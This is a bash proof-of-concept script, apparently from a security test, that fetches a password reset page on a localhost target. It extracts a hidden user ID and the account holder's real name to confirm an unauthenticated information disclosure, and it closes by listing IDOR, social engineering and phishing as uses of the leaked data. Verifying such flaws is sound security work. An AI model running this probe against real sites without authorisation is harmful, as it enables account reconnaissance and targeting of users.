#!/bin/bash

# POC: Account Information Disclosure in Password Reset Form
# This script demonstrates that sensitive account information (user ID and real name)
# is exposed in the password reset form without authentication

TARGET_URL="http://localhost:8082"
USERNAME="test"

echo "[*] Testing Account Information Disclosure in Password Reset Form"
echo "[*] Target: ${TARGET_URL}/password/${USERNAME}"
echo ""

# Fetch the password reset form
RESPONSE=$(curl -s "${TARGET_URL}/password/${USERNAME}")

echo "[*] Response received. Analyzing for sensitive information disclosure..."
echo ""

# Extract hidden user_id field
USER_ID=$(echo "$RESPONSE" | grep -oP 'name="user_id"[^>]*value="\K[^"]+')
if [ -n "$USER_ID" ]; then
    echo "[+] VULNERABLE: Hidden user_id field found!"
    echo "    User ID: $USER_ID"
else
    echo "[-] No hidden user_id field found"
fi

# Extract visible real name from the greeting
REAL_NAME=$(echo "$RESPONSE" | grep -oP 'Welcome, \K[^<]+')
if [ -n "$REAL_NAME" ]; then
    echo "[+] VULNERABLE: Real name disclosed in plaintext!"
    echo "    Real Name: $REAL_NAME"
else
    echo "[-] No real name greeting found"
fi

# Extract page title to confirm we reached the password reset form
PAGE_TITLE=$(echo "$RESPONSE" | grep -oP '<title>\K[^<]+')
if [ -n "$PAGE_TITLE" ]; then
    echo "[+] Page Title: $PAGE_TITLE"
fi

echo ""
echo "[*] Information Disclosure Summary:"
if [ -n "$USER_ID" ] || [ -n "$REAL_NAME" ]; then
    echo "[!] CONFIRMED: Sensitive information disclosed to unauthenticated users"
    echo "    - Username from URL: $USERNAME"
    if [ -n "$REAL_NAME" ]; then
        echo "    - Real Name: $REAL_NAME"
    fi
    if [ -n "$USER_ID" ]; then
        echo "    - User ID: $USER_ID"
    fi
    echo ""
    echo "[!] This information can be used for:"
    echo "    1. IDOR attacks using discovered user IDs"
    echo "    2. Social engineering with real names and usernames"
    echo "    3. Targeted phishing campaigns"
    exit 0
else
    echo "[-] No sensitive information disclosure detected"
    exit 1
fi